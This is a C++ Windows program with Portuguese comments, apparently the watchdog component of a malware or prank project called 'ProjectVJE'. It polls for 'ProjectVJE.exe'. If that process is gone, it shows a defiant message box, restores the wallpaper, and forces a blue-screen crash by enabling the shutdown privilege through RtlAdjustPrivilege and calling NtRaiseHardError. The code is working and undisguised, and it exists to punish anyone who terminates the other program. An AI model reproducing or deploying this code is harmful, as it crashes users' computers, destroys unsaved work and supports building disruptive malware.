#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <iostream>
#include <shlobj.h>
#include <string>
#include <thread>

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void CauseBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
}

// Função para verificar se o processo está rodando
bool IsProcessRunning(const std::wstring &processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return false;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                CloseHandle(snapshot);
                return true; // Encontrado
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return false; // Não encontrado
}

void SetWallpaper(const char* path) {
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

const char* GetCurrentWallpaperPath() {
    static char wallpaperPath[MAX_PATH] = {0};
    HKEY hKey;
    const char* subKey = "Control Panel\\Desktop";
    const char* valueName = "Wallpaper";
    DWORD bufferSize = sizeof(wallpaperPath);
    DWORD type = REG_SZ;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, valueName, nullptr, &type, (LPBYTE)wallpaperPath, &bufferSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return wallpaperPath;
        }
        RegCloseKey(hKey);
    }
    return nullptr;
}

int main() {
    const std::wstring targetProcess = L"ProjectVJE.exe";
    const char* currentWallpaperPath = GetCurrentWallpaperPath();
    while (true) {
        if (!IsProcessRunning(targetProcess)) {
            std::thread([]{MessageBoxW(NULL, L"Não vou deixar isso acontecer", L"ProjectVJE", MB_ICONERROR | MB_OK);}).detach();
            Sleep(5500);
            SetWallpaper(currentWallpaperPath);
            CauseBSOD();
            exit(-1);
        }
        Sleep(500); // Verifica a cada 2 segundos
    }

    return 0;
}
